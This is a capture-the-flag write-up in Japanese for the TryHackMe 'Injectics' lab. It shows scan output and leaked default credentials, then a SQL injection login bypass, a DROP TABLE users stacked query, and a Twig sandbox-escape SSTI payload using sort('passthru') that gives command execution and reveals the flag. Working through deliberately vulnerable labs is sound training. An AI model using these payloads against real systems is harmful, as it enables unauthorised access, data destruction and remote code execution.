
- URL : https://tryhackme.com/room/injectics
 #medium 
- OS : #Linux 
- Hack Date: 2025-07-10,16:05

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

|            |      |                                                               |                                                                                                                                  |
| ---------- | ---- | ------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| ポート        | サービス | バージョン                                                         | その他                                                                                                                              |
| **22/tcp** | ssh  | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) |                                                                                                                                  |
| **80/tcp** | http | Apache httpd 2.4.41 ((Ubuntu))                                | • **タイトル:** Injectics Leaderboard<br>• **許可メソッド:** GET, HEAD, POST, OPTIONS<br>• **Cookieフラグ:** PHPSESSIDのhttponlyフラグが設定されていません。 |
## nmap
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 13:fe:af:a0:31:cf:cd:2b:1f:c5:cb:ac:41:64:7b:ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOCfgA+iTg5JPv1PnvEyc0Dd6ymz4lTyu+yiN+b9Y7haiu+AMdcdXECWy/Uvi5PPWXqaM/mFVAX/RoigZqUlfNyGjuyRaRj2ma49YRnwtP4f6BH1U1403HhPjq32EgDMG1gf8Vg+0YXaUemfzl3i2xI7OQtVoFG0pCBdfMpbmC8lCx/FhOmXvF0G+aLJzLGWG/buDZR18V9G2YbPPWiTPl/bBL9n79XOojU0LQitwKicePjIUqBfq2td4un5uK7rYfCijvqDMJLICrUK6z8FIxbHm0wNE40PZm8+VKOCZZmV8doYVtMw/ZRbraE8iButeQoOksrIeRjjOT6uOGZqcW7kxrPpt/JngqSroOgyWwU1iJUi4Ri2Gl7AS2qRrTbiljMK2LTykHg6HC/3DPnGE25zEusjAvOxyEtOqee8s9tQcoFUgqvQd3kWf+C0HM/vO5Ccn5HjEtYqheVSR3zqEV/KGCpn2/kJMm47s+m/DE7w9DYBQ290eXyzsEC3IRXdc=
|   256 97:fc:6d:fb:aa:9c:55:6f:c8:94:d9:a6:3e:41:4d:3f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCBnAG50L5Z/F7e255RHBWSavhZesbboGX52as4P6esrhXzSFQDddVLNtLyNOPaK5gn1yfNl+IwX5jrBhqKKDcM=
|   256 22:91:bc:62:86:f7:50:8e:a0:29:d9:7c:07:91:40:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBQArADI1gncOe6FIy7wppJL+hxng2Fu7KdFFfo2aSDW
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Injectics Leaderboard
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/10%OT=22%CT=%CU=34997%PV=Y%DS=4%DC=T%G=N%TM=686F66C9
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=103%GCD=2%ISR=109%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M5
OS:09ST11NW7%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B
OS:3)ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Uptime guess: 33.465 days (since Fri Jun  6 12:57:39 2025)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   117.78 ms 10.13.0.1
2   ... 3
4   247.96 ms 10.10.221.209

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds
           Raw packets sent: 39 (2.526KB) | Rcvd: 25 (1.762KB)

```

サイトリンク
- ログインページ
	- http://10.10.221.209/login.php
- Adminログインページ
	- http://10.10.221.209/adminLogin007.php
- 

```
<!-- Website developed by John Tim - dev@injectics.thm-->
<!-- Mails are stored in mail.log file-->
    <!-- Bootstrap JS and dependencies -->
```

## Feroxbuster
```bash
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      161l      368w     5401c http://10.10.0.5/login.php
200      GET        6l      263w    18362c http://10.10.0.5/js/popper.min.js
200      GET        7l     2103w   160302c http://10.10.0.5/css/bootstrap.min.css
301      GET        9l       28w      304c http://10.10.0.5/css => http://10.10.0.5/css/
200      GET        2l     1062w    72380c http://10.10.0.5/js/slim.min.js
200      GET        7l      683w    60044c http://10.10.0.5/js/bootstrap.min.js
200      GET      206l      428w     6588c http://10.10.0.5/
301      GET        9l       28w      303c http://10.10.0.5/js => http://10.10.0.5/js/
301      GET        9l       28w      311c http://10.10.0.5/javascript => http://10.10.0.5/javascript/
301      GET        9l       28w      311c http://10.10.0.5/phpmyadmin => http://10.10.0.5/phpmyadmin/
301      GET        9l       28w      306c http://10.10.0.5/flags => http://10.10.0.5/flags/
301      GET        9l       28w      318c http://10.10.0.5/phpmyadmin/themes => http://10.10.0.5/phpmyadmin/themes/
301      GET        9l       28w      318c http://10.10.0.5/javascript/jquery => http://10.10.0.5/javascript/jquery/
301      GET        9l       28w      315c http://10.10.0.5/phpmyadmin/doc => http://10.10.0.5/phpmyadmin/doc/
301      GET        9l       28w      307c http://10.10.0.5/vendor => http://10.10.0.5/vendor/
301      GET        9l       28w      315c http://10.10.0.5/phpmyadmin/sql => http://10.10.0.5/phpmyadmin/sql/
301      GET        9l       28w      320c http://10.10.0.5/phpmyadmin/doc/html => http://10.10.0.5/phpmyadmin/doc/html/
200      GET        0l        0w   271756c http://10.10.0.5/javascript/jquery/jquery
301      GET        9l       28w      328c http://10.10.0.5/phpmyadmin/doc/html/_images => http://10.10.0.5/phpmyadmin/doc/html/_images/
301      GET        9l       28w      318c http://10.10.0.5/phpmyadmin/locale => http://10.10.0.5/phpmyadmin/locale/
301      GET        9l       28w      321c http://10.10.0.5/phpmyadmin/locale/de => http://10.10.0.5/phpmyadmin/locale/de/
<SNIP>
```
phpMyAdminも存在していることがわかった
phpMyAdmin バージョン 4.9.5deb2


mail.logに、Mailが溜まってるとのことなので、見てみる
このように記載されたページが出てきた
`http://10.10.120.23/mail.log`
![](https://i.imgur.com/hYjn2sk.png)


翻訳
```jp

差出人: dev@injectics.thm
宛先: superadmin@injectics.thm
件名: 休暇前の更新

こんにちは、

休暇に入る前に、ウェブサイトに加えた最新の変更についてご報告いたします。いくつかの改善を実施し、「Injectics」という特別なサービスを有効化しました。このサービスはデータベースを常時監視し、安定した状態を保つように設計されています。

安全性をさらに高めるために、万が一 users テーブルが削除されたり破損したりした場合に、デフォルトの認証情報を自動的に挿入するようサービスを設定しました。これにより、システムへのアクセスおよび必要な保守作業を常に行えるようになります。このサービスは1分ごとに実行されるようスケジュールされています。

以下が追加されるデフォルトの認証情報です：

メールアドレス	パスワード
superadmin@injectics.thm	superSecurePasswd101
dev@injectics.thm	devPasswd123

その他に更新や変更が必要な場合は、お知らせください。

よろしくお願いいたします。
Devチーム
dev@injectics.thm
```

認証情報を取得できたので、この認証情報でログインを試みる
しかし、以下のログインページでは全ての認証情報でログインできない
- ログインページ
	- `http://10.10.221.209/login.php`
- Adminログインページ
	- `http://10.10.221.209/adminLogin007.php`
- PHPMyAdminのログインページ

なるほど、ちゃんと読むと、usersテーブルを削除か、破損させないといけないということか
phpMyAdminから、MySQLが動いていることがわかる
![](https://i.imgur.com/1CIX81W.png)


上ですでにわかっているphpMyAdminのバージョンで検索すると、このような脆弱性が見つかる
- https://www.cvedetails.com/vulnerability-list/vendor_id-784/product_id-1341/version_id-1336005/Phpmyadmin-Phpmyadmin-4.9.5.html

その中でも、 SQLインジェクションの脆弱性を持つ、CVE-2020-26935に着目する
- https://www.cvedetails.com/cve/CVE-2020-26935/

## CVE-2020-26935
詳細
- https://nvd.nist.gov/vuln/detail/CVE-2020-26935
対象
- バージョン 4.9.x（4.9.6未満）
- バージョン 5.0.x（5.0.3未満）

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

|**要素**|**値**|**意味**|
|---|---|---|
|**AV（攻撃元区分）**|N（Network）|攻撃はリモートから実行可能（インターネット経由でOK）|
|**AC（攻撃の複雑さ）**|L（Low）|攻撃は簡単。特別な条件や設定不要、再現性も高い|
|**PR（必要な権限）**|N（None）|攻撃者は**認証・ログイン不要**で実行可能|
|**UI（ユーザー関与）**|N（None）|ユーザーの操作・介入は**一切不要**|
|**S（スコープ）**|U（Unchanged）|攻撃対象のコンポーネントと影響範囲が同一（例：同一プロセス内で完結）|
|**C（機密性への影響）**|H（High）|機密データの**完全な漏洩が可能**|
|**I（完全性への影響）**|H（High）|データの**改ざん・偽造が完全に可能**|
|**A（可用性への影響）**|H（High）|サービスが**停止・破壊される可能性が高い（DoS級）**|

PoC
- https://advisory.checkmarx.net/advisory/CX-2020-4281/

しかし、PoCで使われている`tbl_zoom_select.php`はログインが必要で、実際に試してみてもログインしていないため、ログインフォームが’返ってくる
![](https://i.imgur.com/zKHRNHU.png)



立ち返って、ログインフォームで、どんなインジェクションが効くのかを確認する
以下のログインエラーではなく、エラーが返ってくるものを調べる
```HTTP Response
HTTP/1.1 200 OK
Date: Mon, 14 Jul 2025 09:18:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":"error","message":"Invalid email or password"}
```

## ログインバイパス
以下のペイロードを使用する
- https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/refs/heads/master/Intruder/exploit/Auth_Bypass.txt

usernameに対して、ffufで辞書攻撃を行う
```sh
┌──(kali㉿kali)-[~/Desktop/THM/machine/Injectics]
└─$ ffuf -u http://10.10.120.23/functions.php \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=FUZZ&password=devPasswd123&function=login" \
-w Auth_Bypass.txt \
-mc all -fs 56

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.120.23/functions.php
 :: Wordlist         : FUZZ: /home/kali/Desktop/THM/machine/Injectics/Auth_Bypass.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=devPasswd123&function=login
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 56
________________________________________________

' OR 'x'='x'#;          [Status: 200, Size: 150, Words: 2, Lines: 1, Duration: 251ms]
:: Progress: [198/198] :: Job [1/1] :: 43 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

ログインに成功する
![](https://i.imgur.com/ObibRta.png)

## 認証情報のリセット
devとしてログインできる
![](https://i.imgur.com/NCqKQR1.png)

Editで、Goldを`1111;`と入力すると、全部のGoldが1111..となる
![](https://i.imgur.com/BvTAZvY.png)

結果
![](https://i.imgur.com/02RS9GS.png)


usersテーブルを削除
MysqlのDrop Table構文を検索する
- https://www.javadrive.jp/mysql/table/index4.html

構文に従って、構文を組み立てる
```sql
111111;DROP TABLE users;
```

実行結果
![](https://i.imgur.com/GdIx8wF.png)

ログアウトして、認証情報がリセットされているかを確認する
Adminログインページに、デフォルトの`superadmin@injectics.thm`の認証情報でログインしてみる
![](https://i.imgur.com/9384W3Y.png)


phpMyAdminでの認証情報は切り替わっていない様子
![](https://i.imgur.com/dW37jAm.png)


## SSTIでのRCE
ログインできたadminに戻って、`http://10.10.120.23/dashboard.php`でFirstnameを`admin`から`adminssss`に変更する
![](https://i.imgur.com/i8SGEGY.png)そして、`http://10.10.120.23/dashboard.php`に戻ると、こんな感じで、adminssssに変更されている

![](https://i.imgur.com/xA9qcTk.png)

そのため、SSTIインジェクションができるかもしれない
まず、SSTIのテンプレートを特定する
[[Server-Side Attacks#SSTI]]のグラフに従う
入力 : 出力
`${7*7}` : `${7*7}`
`{{7*7}}` : `49`
`{{7*'7'}}` : `49`

よって、使われているテンプレートエンジンが、Twigだとわかる

TwigでRCEを行う
でも、なんかエラー起きちゃう
`{{['id']|filter('system')}}` : `The callable passed to "filter" filter must be a Closure in sandbox mode in "__string_template__8a0a34f3ef7bb4027995c4af464e338fdb11b6a04e25524a117eb8284867d004" at line 1.`

調べてみると、サンドボックスモードが有効になっていて、`filter('system')`が無効化されているっぽい

一旦、他に制限されているものがないのか調べてみる
- `{{_self}}` :  `__string_template__80c748bbd7ccfa7c519653b712300c6d6fd1344f2474ec484eae268c7f73a7a9`
- `{{ _self.environment }}` : `Tag "import" is not allowed in "__string_template__40096bcaa08125ec931f9dc771222c38ce7ab3c38d00e368f231b04aa0850e2b".`

ペイロード一覧
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig

調べると、以下のものは制限されているとわかった
- split
- set
- keys
- first
- constant
- import
- dump
- file_excerpt
- filter
- map

成功したペイロード
- `{{_context}}` : Array
- `{{['ls']|sort('system')}}`  : Array

ペイロードの中に、`{{['id']|filter('passthru')}}`というのがあった。これでは、`filter`関数が使えないので、ダメ。
しかし、`{{['ls']|sort('system')}}`のsystemをpassthruに変更したら、どうなのか

`{{['ls']|sort('passthru')}}`　: Array

このArrayの中を見たい
sort() は 要素数が2つ以上の配列にしか実質的に「ソート」処理を行わず、内部で比較関数（ここでは passthru）を呼び出すのは、複数要素を比較するときだけだから、要素が一つの時は、sortが呼び出されずに、Arrayと出力される。
だから、以下のようにすると、lsコマンドの結果が出力される
`{{['ls','a']|sort('passthru')}}`
![](https://i.imgur.com/d1QjkOn.png)

結果
![](https://i.imgur.com/K0tfGf6.png)


これを利用して、フラグを取得する
`{{ ['ls flags',''] | sort('passthru') }}` : Welcome, 5d8af1dc14503c7e4bdc8e51a3469f48.txt Array!

`{{ ['cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',''] | sort('passthru') }}` : Welcome, THM{5735172b6c147f4dd649872f73e0fdea} Array!


# 参考文献
- https://jaxafed.github.io/posts/tryhackme-injectics/#logging-in-to-the-admin-panel
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt

